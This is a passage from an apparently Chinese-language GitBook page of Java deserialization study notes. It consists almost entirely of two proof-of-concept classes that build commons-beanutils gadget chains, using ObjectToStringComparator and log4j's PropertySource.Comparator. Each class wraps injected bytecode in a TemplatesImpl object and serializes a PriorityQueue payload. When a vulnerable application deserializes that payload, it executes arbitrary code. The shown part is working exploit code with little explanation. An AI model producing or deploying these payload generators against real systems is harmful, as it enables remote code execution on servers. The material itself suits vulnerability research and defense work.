<span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;
<span class="hljs-comment">/**
 * &lt;dependency&gt;
 *   &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
 *   &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt;
 *   &lt;version&gt;3.12.0&lt;/version&gt;
 * &lt;/dependency&gt;
 * */</span>
<span class="hljs-keyword">import</span> org.apache.commons.lang3.compare.ObjectToStringComparator;


<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.PriorityQueue;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsBeanutils2_ObjectToStringComparator</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(<span class="hljs-keyword">true</span>);
        field.set(obj, value);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] getPayload(<span class="hljs-keyword">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception {
        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{clazzBytes});
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EvilTemplatesImpl&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);


        <span class="hljs-comment">/**&#x4F7F;&#x7528;ObjectToStringComparator&#x7C7B;*/</span>
        <span class="hljs-comment">// ObjectToStringComparator stringComparator = new ObjectToStringComparator();</span>
        <span class="hljs-keyword">final</span> BeanComparator beanComparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> ObjectToStringComparator());
        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator);
        <span class="hljs-comment">// stub data for replacement later</span>
        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);priorityQueue.add(<span class="hljs-string">&quot;2&quot;</span>);
        <span class="hljs-comment">/**&#x6362;&#x7528;&#x7EE7;&#x627F;&#x4F1A;&#x89E6;&#x53D1;&#x4E00;&#x4E9B;&#x987A;&#x5E8F;&#x4E0A;&#x7684;&#x95EE;&#x9898;*/</span>
        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);
        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> Object[]{templates, templates});

        <span class="hljs-comment">// ==================</span>
        <span class="hljs-comment">// &#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;</span>
        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(priorityQueue);
        oos.close();

        <span class="hljs-keyword">return</span> barr.toByteArray();
    }
}
</code></pre>
<h4 id="propertysource">PropertySource</h4>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
    &lt;version&gt;2.13.3&lt;/version&gt;
&lt;/dependency&gt;
</code></pre><p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsBeanutils;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
<span class="hljs-keyword">import</span> com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
<span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;
<span class="hljs-keyword">import</span> org.apache.logging.log4j.util.PropertySource;

<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.PriorityQueue;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsBeanutils2_PropertySource</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(<span class="hljs-keyword">true</span>);
        field.set(obj, value);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] getPayload(<span class="hljs-keyword">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception {
        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{clazzBytes});
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EvilTemplatesImpl&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);

        AttrNSImpl attrNS1 = <span class="hljs-keyword">new</span> AttrNSImpl();
        CoreDocumentImpl coreDocument = <span class="hljs-keyword">new</span> CoreDocumentImpl();
        attrNS1.setValues(coreDocument, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);

        <span class="hljs-comment">/**&#x4F7F;&#x7528;PropertySource.Comparator&#x7C7B;*/</span>
        <span class="hljs-keyword">final</span> PropertySource propertySource = <span class="hljs-keyword">new</span> PropertySource() {
            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getPriority</span><span class="hljs-params">()</span> </span>{
                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
            }
        };

        <span class="hljs-keyword">final</span> BeanComparator beanComparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> PropertySource.Comparator());
        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator);
        <span class="hljs-comment">// stub data for replacement later</span>
        priorityQueue.add(propertySource);priorityQueue.add(propertySource);
        <span class="hljs-comment">/**&#x6362;&#x7528;&#x7EE7;&#x627F;&#x4F1A;&#x89E6;&#x53D1;&#x4E00;&#x4E9B;&#x987A;&#x5E8F;&#x4E0A;&#x7684;&#x95EE;&#x9898;*/</span>
        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);
        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> Object[]{templates, templates});

        <span class="hljs-comment">// ==================</span>
        <span class="hljs-comment">// &#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;</span>
        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(priorityQueue);
        oos.close();

        <span class="hljs-keyword">return</span> barr.toByteArray();
    }
}
</code></pre>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="../" class="navigation navigation-prev navigation-unique" aria-label="Previous page: Introduction">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"CommonsCollections逐步分析","level":"1.2","depth":1,"next":{"title":"fastjson逐步分析(PDF)","level":"1.3","depth":1,"url":"https://github.com/AmTrain-Ricky/amtrain-ricky.github.io/tree/main/javanote","ref":"https://github.com/AmTrain-Ricky/amtrain-ricky.github.io/tree/main/javanote","articles":[]},"previous":{"title":"Introduction","level":"1.1","depth":1,"path":"README.md","ref":"README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-lunr","-search","search-pro","github"],"pluginsConfig":{"github":{"url":"https://github.com/AmTrain-Ricky/amtrain-ricky.github.io"},"search-pro":{},"highlight":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css"}},"file":{"path":"javanote/CommonsCollections逐步分析.md","mtime":"2022-06-06T12:41:52.041Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-07-03T12:32:36.343Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-pro/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

